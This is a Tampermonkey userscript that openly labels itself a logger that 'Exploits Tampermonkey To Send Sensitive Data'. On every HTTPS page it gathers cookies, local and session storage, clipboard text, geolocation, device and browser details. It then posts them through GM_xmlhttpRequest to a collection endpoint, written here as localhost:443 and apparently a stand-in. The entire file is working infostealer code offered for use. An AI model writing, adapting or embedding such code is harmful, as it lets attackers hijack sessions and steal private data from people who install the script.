// ==UserScript==
// @name         Tampermonkey logger
// @version      1.0
// @description  Exploits Tampermonkey To Send Sensitive Data
// @author       Mohalk
// @namespace    https://guns.lol/mohalk
// @match        https://*/*
// @grant        GM_xmlhttpRequest
// ==/UserScript==

function getLocalStorage() {
    let localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
    }
    return localStorageData;
}

function getSessionStorage() {
    let sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        let key = sessionStorage.key(i);
        sessionStorageData[key] = sessionStorage.getItem(key);
    }
    return sessionStorageData;
}

function getCookies() {
    let cookiesData = {};
    if (document.cookie) {
        document.cookie.split("; ").forEach(cookie => {
            let [key, value] = cookie.split("=");
            cookiesData[key] = decodeURIComponent(value);
        });
    }
    return cookiesData;
}

async function getIndexedDB() {
    let indexedDBData = [];
    if (window.indexedDB && indexedDB.databases) {
        let databases = await indexedDB.databases();
        indexedDBData = databases.map(db => db.name);
    }
    return indexedDBData;
}

async function getCacheStorage() {
    let cacheStorageData = [];
    if ("caches" in window) {
        let cacheNames = await caches.keys();
        cacheStorageData = cacheNames;
    }
    return cacheStorageData;
}

async function getStorageQuota() {
    let storageQuotaData = {};
    if (navigator.storage && navigator.storage.estimate) {
        let estimate = await navigator.storage.estimate();
        storageQuotaData = {
            quota: estimate.quota,
            usage: estimate.usage,
        };
    }
    return storageQuotaData;
}

function getGeolocation() {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                },
                error => {

                    if (error.code === error.PERMISSION_DENIED) {
                        resolve(null);
                    } else {
                        resolve({
                            error: error.message
                        });
                    }
                }
            );
        } else {
            resolve(null);
        }
    });
}

function getPerformanceData() {
    return {
        timing: performance.timing.toJSON(),
        navigation: performance.getEntriesByType("navigation"),
    };
}

async function getClipboardData() {
    let clipboardData = null;
    if (navigator.clipboard && navigator.clipboard.readText) {
        try {
            clipboardData = await navigator.clipboard.readText();
        } catch (err) {
            clipboardData = {
                error: "Clipboard access denied."
            };
        }
    }
    return clipboardData;
}

async function getMediaDevices() {
    let mediaDevicesData = [];
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        let devices = await navigator.mediaDevices.enumerateDevices();
        mediaDevicesData = devices.map(device => ({
            kind: device.kind,
            label: device.label,
        }));
    }
    return mediaDevicesData;
}

function getPageInfo() {
    return {
        title: document.title,
        scripts: document.scripts.length,
        images: document.images.length,
        links: document.links.length,
    };
}

function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
    };
}


async function collectAllData() {
    const data = {
        localStorage: getLocalStorage(),
        sessionStorage: getSessionStorage(),
        cookies: getCookies(),
        indexedDB: await getIndexedDB(),
        cacheStorage: await getCacheStorage(),
        storageQuota: await getStorageQuota(),
        geolocation: await getGeolocation(),
        performance: getPerformanceData(),
        clipboard: await getClipboardData(),
        mediaDevices: await getMediaDevices(),
        pageInfo: getPageInfo(),
        browserInfo: getBrowserInfo(),
    };
    return data;
}


class HTTPRequest {
    constructor() {}

    async get(url, headers = {}, responseType = "json") {
        return new Promise((resolve, reject) => {
            GM_xmlhttpRequest({
                method: "GET",
                url: url,
                headers: headers,
                responseType: responseType,
                onload: function(response) {
                    resolve(response);
                },
                onerror: function(error) {
                    reject(error);
                }
            });
        });
    }

    async post(url, data = {}, headers = {}) {
        return new Promise((resolve, reject) => {
            GM_xmlhttpRequest({
                method: "POST",
                url: url,
                headers: headers,
                data: JSON.stringify(data),
                onload: function(response) {
                    resolve(response);
                },
                onerror: function(error) {
                    reject(error);
                }
            });
        });
    }
}


async function transportData() {
    const httpRequest = new HTTPRequest();

    try {
        const validationResponse = await httpRequest.get('http://localhost:443/api/validation');

        if (validationResponse.status === 200) {
            const data = await collectAllData();

            await httpRequest.post('http://localhost:443/api/handler', data, {
                'Content-Type': 'application/json',
            });

        }
    } catch (error) {}
}



transportData();